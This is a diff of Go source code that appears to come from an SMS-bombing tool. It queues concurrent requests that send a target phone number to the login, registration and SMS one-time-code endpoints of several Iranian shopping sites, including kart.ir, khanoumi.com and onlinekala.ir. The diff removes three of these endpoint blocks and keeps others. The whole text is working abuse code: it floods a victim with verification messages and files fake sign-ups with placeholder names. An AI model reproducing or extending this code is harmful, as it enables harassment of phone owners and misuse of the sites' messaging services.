@@ -564,29 +564,6 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://kart.ir/api/auth/authenticate ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "username": phone,
-        }
-        sendJSONRequest(c, ctx, "https://kart.ir/api/auth/authenticate", payload, &wg, ch)
-    }
-}(client)
-
-// ------ https://accounts.khanoumi.com/account/login/init ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
-        formData.Set("loginIdentifier", phone)
-        formData.Set("loginSchemeName", "sms")
-        sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
-    }
-}(client)
-
 // ------ https://www.1001kharid.com/wp-admin/admin-ajax.php ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
@@ -617,7 +594,6 @@ tasks <- func(c *http.Client) func() {
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
-        // این API نیاز به ساختار خاص (Livewire) دارد. ساده‌ترین راه ارسال phone در قالب JSON است:
         payload := map[string]interface{}{
             "updates": []map[string]interface{}{
                 {
@@ -689,22 +665,6 @@ tasks <- func(c *http.Client) func() {
         formData.Set("type", "login")
         // بقیه فیلدها مقدار خاص ندارند
         sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
-// ------ https://www.onlinekala.ir/login?back=my-account ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("back", "my-account")
-        formData.Set("username", phone)
-        formData.Set("id_customer", "")
-        formData.Set("firstname", "مانس")
-        formData.Set("lastname", "مین")
-        formData.Set("action", "register")
-        formData.Set("ajax", "1")
-        sendFormRequest(c, ctx, "https://www.onlinekala.ir/login?back=my-account", formData, &wg, ch)
     }
 }(client)
 
